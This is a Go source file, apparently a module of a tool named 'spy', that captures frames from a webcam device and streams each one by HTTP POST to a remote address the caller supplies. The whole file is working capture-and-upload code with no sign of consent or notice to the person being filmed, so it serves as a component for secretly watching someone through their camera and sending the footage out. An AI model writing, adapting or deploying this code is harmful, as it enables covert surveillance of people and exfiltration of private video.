package webcam

import (
	"bytes"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"time"

	"github.com/cinus-ue/spy/literr"
	"github.com/cinus-ue/spy/util"
)

type Params struct {
	Address           string
	DeviceID, Quality int
	Verbose           bool
}

type Capture struct {
	verbose, running bool
	device           *Device
	client           *http.Client
}

func (c *Capture) StartCapture(p Params) (err error) {
	c.verbose = p.Verbose
	c.running = true
	c.client = util.HttpClient()
	data := make(chan []byte, 200000)
	device, err := NewVideoCapturer(p.DeviceID, p.Quality, data)
	if err != nil {
		return
	}
	c.device = device
	go func() {
		if literr.CheckError(device.Capture()) {
			c.running = false
		}
	}()
	for c.running {
		frame := <-data
		if frame != nil {
			literr.CheckError(c.write(frame, p.Address))
		}
		time.Sleep(1 * time.Millisecond)
	}
	return
}

func (c *Capture) Close() error {
	c.running = false
	return c.device.Close()
}

func (c *Capture) write(data []byte, address string) error {
	buffer := &bytes.Buffer{}
	writer := multipart.NewWriter(buffer)
	fileWriter, _ := writer.CreateFormFile("files", "webcam")
	written, err := io.Copy(fileWriter, bytes.NewReader(data))
	if err != nil {
		return err
	}
	if c.verbose {
		log.Printf("Frame size : %d bytes, write bytes : %d", len(data), written)
	}
	writer.Close()

	resp, err := c.client.Post(address, writer.FormDataContentType(), buffer)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	respBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	if c.verbose {
		log.Printf(" status:%s response:%s\n", resp.Status, string(respBody))
	}
	return nil
}
